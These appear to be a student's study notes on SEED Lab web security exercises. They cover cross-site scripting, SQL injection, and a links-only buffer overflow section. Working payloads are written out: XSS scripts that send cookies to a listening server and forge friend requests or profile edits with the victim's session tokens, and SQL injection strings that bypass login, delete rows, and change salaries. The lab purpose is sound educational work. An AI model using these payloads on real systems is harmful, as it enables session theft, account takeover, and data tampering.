# Independent study on web security issues( Based on Seedlab, Syracuse University) 

## Cross site Scripting 

### Useful Links:
* Web and network security, CS 155, Stanford University, https://crypto.stanford.edu/cs155/
* https://excess-xss.com/
* Seedlab, Syracuse University,http://www.cis.syr.edu/~wedu/seed/ 

### Tasks:

#### A simple blogpost application in php 
* Link : https://gitlab.com/shivapbhusal/app_analysis/tree/shiva/security_examples/xss
* Shows how attackers can inject malicious JavaScript code to the system and perform evil activities. 

#### SeedLab Activities 
Link : http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Web/Web_XSS_Elgg/Web_XSS_Elgg.pdf
#### Task 1: Popup window
The user injects this code in his profile. When other user visits his profile, a popup window appears. 

```javascript
<script>
alert('XSS attack');
</script>
```

#### Task 2 : Display cookies 

```javascript
<script>
alert(document.cookie);
</script>
```

#### Task 3: Stealing cookies: 
The TCP server program in c can be used to view the cookie information from the port 5555. 

```javascript
<script>
document.write('<img src=http://127.0.0.1:5555?c='+escape(document.cookie) + '   >');
</script>
```

#### Task 4 : Sending the friend request on behalf of the user. 
If I inject this code to my profile, whoever visits my profile will send a friend request to me. 

```javascript
<script>
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=40"+ts+token; 
var Ajax=new XMLHttpRequest ();
Ajax.open("GET",sendurl,true); 
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(); 
</script>
```

#### Task 5: Changing the profile information of the user. 
It is not working properly. The draft code for the post request looks like this. We need to figure out how we can get name and other information 

```javascript 
<script>
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var content=ts+token+"&name=Charlie&description=Samy_is_my_hero&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=41"; 
Ajax.send(content);
</script>
```

## SQL injection 
### Tasks:

#### A simple PHP application. 
* Link : https://gitlab.com/shivapbhusal/app_analysis/blob/master/security_examples/sql_injection.php

#### Seedlab tasks 
* Link : http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Web/Web_SQL_Injection/SQL_Injection.pdf

#### Task 1: Playing with the MySQL console 
```sql
mysql -u root -pseedubuntu
use Users; # name of the database 
show tables; # show all the tables in Users database 
```

#### Task 2.1 : SQL injection attack from webpage 
To simply login, attacker can type this in the Employee ID textbox 
```
a ' or 1 #

```

To login as admin, attacker can type this. We assume, attacker knows the name of admin. 
```
a ' or Name='Admin' #
```

#### Task 2.2. : From the command line 
```
curl 'http://www.seedlabsqlinjection.com/unsafe_credential.php?EID=a+%27+or+Name%3D%27Admin%27+%23&Password=aass'
``` 

#### Task 2.3. : Append a new SQL statement 
Had some issues with this. Draft script. P.S : Attacker will also not know the table name. 
```
a ';delete from credential where Name='Abc'#
```

#### Task 3.1 : Updating the salary 
Employee can't edit their salary information. But they can do this with the help of SQL injection attack. Type this in any of the field 
```
aaaaaa',salary=100000#
```

#### Task 3.2 : Updating the salary of one specific person
Set the value of first field as 
```
aaaaaa',salary=1 where Name='Ryan'#
```

& set the values of every other fields as # so that every statements executed are commented out. 

## Buffer Overflow 
### Tasks:

#### Sample demo application
* Link : https://gitlab.com/shivapbhusal/app_analysis/blob/master/security_examples/bufferoverflow.c

#### Useful Links:
* https://courses.cs.washington.edu/courses/cse451/05sp/section/overflow1.ppt
* Smashing the stack for fun and profit, http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf
* Lecture Notes: http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Buffer_Overflow.pdf
* https://dhavalkapil.com/blogs/Shellcode-Injection/
* GDB tutorial: http://www.unknownroad.com/rtfm/gdbtut/gdbtoc.html

#### Seedlab tasks 
* Link : http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Buffer_Overflow/Buffer_Overflow.pdf
